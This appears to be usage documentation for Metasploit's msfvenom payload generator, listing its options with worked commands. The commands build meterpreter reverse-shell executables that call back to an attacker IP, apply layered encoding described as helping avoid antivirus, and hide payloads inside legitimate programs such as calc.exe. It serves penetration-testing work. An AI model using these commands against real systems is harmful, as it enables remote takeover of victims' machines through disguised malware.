Msfvenom is the combination of payload generation and encoding. It replaced msfpayload and msfencode on June 8th 2015.

To start using msfvenom, first please take a look at the options it supports:

```
Options:
    -l, --list            <type>     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all
    -p, --payload         <payload>  Payload to use (--list payloads to list, --list-options for arguments). Specify '-' or STDIN for custom
        --list-options                List --payload <value>'s standard, advanced and evasion options
    -f, --format          <format>   Output format (use --list formats to list)
    -e, --encoder         <encoder>  The encoder to use (use --list encoders to list)
        --service-name    <value>    The service name to use when generating a service binary
        --sec-name        <value>    The new section name to use when generating large Windows binaries. Default: random 4-character alpha string
        --smallest                    Generate the smallest possible payload using all available encoders
        --encrypt         <value>    The type of encryption or encoding to apply to the shellcode (use --list encrypt to list)
        --encrypt-key     <value>    A key to be used for --encrypt
        --encrypt-iv      <value>    An initialization vector for --encrypt
    -a, --arch             <arch>    The architecture to use for --payload and --encoders (use --list archs to list)
        --platform        <platform> The platform for --payload (use --list platforms to list)
    -o, --out              <path>    Save the payload to a file
    -b, --bad-chars        <list>    Characters to avoid example: '\x00\xff'
    -n, --nopsled          <length>  Prepend a nopsled of [length] size on to the payload
        --pad-nops                    Use nopsled size specified by -n <length> as the total payload size, auto-prepending a nopsled of quantity (nops minus payload length)
    -s, --space            <length>  The maximum size of the resulting payload
        --encoder-space   <length>   The maximum size of the encoded payload (defaults to the -s value)
    -i, --iterations       <count>   The number of times to encode the payload
    -c, --add-code         <path>    Specify an additional win32 shellcode file to include
    -x, --template         <path>    Specify a custom executable file to use as a template
    -k, --keep                        Preserve the --template behaviour and inject the payload as a new thread
    -v, --var-name         <value>   Specify a custom variable name to use for certain output formats
    -t, --timeout          <second>  The number of seconds to wait when reading the payload from STDIN (default 30, 0 to disable)
        --refresh-cache               Rebuild the module metadata cache from disk before listing
    -h, --help                        Show this message
```

Run `./msfvenom -h` at any time to see this list straight from your installed version — flags do change between releases, and the output above may lag behind it.

# How to generate a payload

To generate a payload, there are two flags that you must supply (-p and -f):

* **The -p flag: Specifies what payload to generate**

To see what payloads are available from Framework, you can do:

```
./msfvenom -l payloads
```

The -p flag also supports "-" as a way to accept a custom payload:

```
cat payload_file.bin | ./msfvenom -p - -a x86 --platform win -e x86/shikata_ga_nai -f raw
```

* **The -f flag: Specifies the format of the payload**

Syntax example:

```
./msfvenom -p windows/meterpreter/bind_tcp -f exe
```

To see what formats are supported, you can do the following to find out:

```
./msfvenom --list formats
```

Typically, this is probably how you will use msfvenom:

```
$ ./msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker's IP] lport=4444 -f exe -o /tmp/my_payload.exe
```


# How to encode a payload

By default, the encoding feature will automatically kick in when you use the -b flag (the badchar flag). In other cases, you must use the -e flag like the following:

```
./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw
```

To find out what encoders you can use, you can use the -l flag:

```
./msfvenom -l encoders
```

You can also encode the payload multiple times using the -i flag. Sometimes more iterations may help avoiding antivirus, but know that encoding isn't really meant to be used a real AV evasion solution:

```
./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3 
```

# How to avoid bad characters

The -b flag is meant to be used to avoid certain characters in the payload. When this option is used, msfvenom will automatically find a suitable encoder to encode the payload:

```
./msfvenom -p windows/meterpreter/bind_tcp -b '\x00' -f raw
```

# How to supply a custom template

By default, msfvenom uses templates from the msf/data/templates directory. If you'd like to choose your own, you can use the -x flag like the following:

```
./msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe > new.exe 
```

Please note: If you'd like to create a x64 payload with a custom x64 custom template for Windows, then instead of the exe format, you should use exe-only:

```
./msfvenom -p windows/x64/meterpreter/bind_tcp -x /tmp/templates/64_calc.exe -f exe-only > /tmp/fake_64_calc.exe
```

The -x flag is often paired with the -k flag, which allows you to run your payload as a new thread from the template. However, this currently is only reliable for older Windows machines such as x86 Windows XP.

# How to chain msfvenom output

The old ``msfpayload`` and ``msfencode`` utilities were often chained together in order layer on multiple encodings. This is possible using ``msfvenom`` as well:

```
./msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.3 LPORT=4444 -f raw -e x86/shikata_ga_nai -i 5 | \
./msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | \
./msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o payload.exe
```
